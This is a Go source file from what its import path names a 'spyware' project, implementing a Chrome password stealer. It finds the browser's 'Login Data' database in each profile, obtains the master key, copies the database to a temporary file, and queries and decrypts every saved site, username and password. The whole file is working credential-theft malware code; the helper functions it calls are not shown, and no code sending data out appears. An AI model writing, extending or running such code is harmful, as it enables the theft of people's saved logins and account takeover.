package chrome

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"

	"github.com/Nevesto/spyware/models"
	_ "modernc.org/sqlite"
)

func FindLoginDataFile() (string, error) {
	chromeUserDataPath, err := GetChromeUserDataPath()
	if err != nil {
		return "", fmt.Errorf("failed to get Chrome user data path: %w", err)
	}

	loginDataPath := filepath.Join(chromeUserDataPath, "Login Data")
	if _, err := os.Stat(loginDataPath); err == nil {
		return loginDataPath, nil
	}

	profiles, err := GetChromeProfilePaths()
	if err != nil {
		return "", fmt.Errorf("failed to get Chrome profile paths: %w", err)
	}

	for _, profile := range profiles {
		loginDataPath = filepath.Join(profile, "Login Data")
		if _, err := os.Stat(loginDataPath); err == nil {
			return loginDataPath, nil
		}
	}

	return "", fmt.Errorf("Chrome Login Data file not found")
}

func ReadPasswords(loginDataPath string) ([]models.Password, error) {
	masterKeyPath, err := GetMasterKeyPath()
	if err != nil {
		return nil, fmt.Errorf("failed to get master key path: %w", err)
	}
	masterKey, err := getMasterKey(masterKeyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to get master key: %w", err)
	}
	tempLoginDataPath, err := copyToTemp(loginDataPath)
	if err != nil {
		return nil, fmt.Errorf("failed to copy Login Data file to temp: %w", err)
	}
	defer os.Remove(tempLoginDataPath)

	db, err := sql.Open("sqlite", tempLoginDataPath)
	if err != nil {
		log.Printf("Failed to open Login Data database: %v", err)
		return nil, fmt.Errorf("failed to open Login Data database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Printf("Failed to query logins table: %v", err)
		return nil, fmt.Errorf("failed to query logins table: %w", err)
	}
	defer rows.Close()

	var passwords []models.Password
	for rows.Next() {
		var originURL, username, password []byte
		if err := rows.Scan(&originURL, &username, &password); err != nil {
			log.Printf("Failed to scan row: %v", err)
			return nil, fmt.Errorf("failed to scan row: %w", err)
		}

		decryptedPassword, err := DecryptPassword(password, masterKey)
		if err != nil {
			decryptedPassword = fmt.Sprintf("DECRYPTION_FAILED: %v", err)
		}

		passwordEntry := models.Password{
			OriginURL: string(originURL),
			Username:  string(username),
			Password:  decryptedPassword,
		}
		passwords = append(passwords, passwordEntry)
	}

	if err = rows.Err(); err != nil {
		return nil, fmt.Errorf("error during rows iteration: %w", err)
	}

	return passwords, nil
}

func copyToTemp(srcPath string) (string, error) {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return "", fmt.Errorf("failed to open source file: %w", err)
	}
	defer srcFile.Close()

	tempFile, err := os.CreateTemp("", "login_data_*.tmp")
	if err != nil {
		return "", fmt.Errorf("failed to create temporary file: %w", err)
	}
	defer tempFile.Close()

	_, err = io.Copy(tempFile, srcFile)
	if err != nil {
		return "", fmt.Errorf("failed to copy file content: %w", err)
	}

	return tempFile.Name(), nil
}
